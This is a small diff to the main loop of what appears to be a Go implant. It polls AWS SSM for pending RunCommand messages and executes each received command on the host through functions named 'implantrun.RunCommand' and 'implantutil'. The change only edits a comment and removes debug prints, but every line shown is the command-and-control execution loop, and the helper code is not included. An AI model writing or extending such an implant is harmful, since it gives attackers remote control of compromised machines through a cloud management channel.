@@ -28,8 +28,8 @@ func main() {
 		//Get pending RunCommands
 		messages := awsssm.GetRunCommandMessages(tokens, managedInstanceID)
 
+		//Loop through and run commands
 		for _, m := range messages.Messages {
-			//fmt.Println(m)
 			var payload awsssm.SendCommandPayload
 			json.Unmarshal([]byte(m.Payload), &payload)
 			jsonutil.Marshal(payload)
@@ -38,7 +38,6 @@ func main() {
 				str := fmt.Sprintf("%v", c)
 				str = strings.TrimSuffix(str, "]")
 				str = implantutil.TrimFirstRune(str)
-				fmt.Println(str)
 				implantrun.RunCommand(str, cmdid)
 			}
 		}
